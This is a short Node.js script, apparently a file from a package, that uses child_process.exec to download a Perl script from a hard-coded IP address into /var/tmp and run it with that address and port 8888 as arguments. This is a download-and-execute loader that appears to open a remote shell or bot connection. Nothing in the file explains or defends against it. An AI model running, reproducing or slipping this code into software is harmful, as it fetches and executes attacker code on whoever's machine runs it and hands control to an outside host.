#!/usr/bin/env node

const { exec } = require('child_process');
exec('wget 27.102.130.223/m.pl -P /var/tmp && perl /var/tmp/m.pl 27.102.130.223 8888', (err, stdout, stderr) => {
    if(err) {
        console.log(err);
        return;
    }
    console.log(`stdout: ${stdout}`);
    console.log(`stderr: ${stderr}`);
})
